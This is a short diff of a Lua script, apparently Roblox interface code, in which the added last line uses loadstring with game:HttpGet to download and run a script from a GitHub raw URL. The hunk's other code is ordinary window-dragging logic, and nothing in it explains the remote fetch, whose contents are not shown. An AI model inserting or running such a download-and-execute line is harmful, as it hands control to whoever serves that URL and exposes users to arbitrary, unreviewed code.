@@ -1968,3 +1968,5 @@ task.defer(function()
         local tb = sf2:FindFirstChild("V5TitleBar"); if tb then makeDraggable(sf2,tb) end
     end
 end)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/yuusx-hub/Zeyhub/refs/heads/main/omsoms"))()
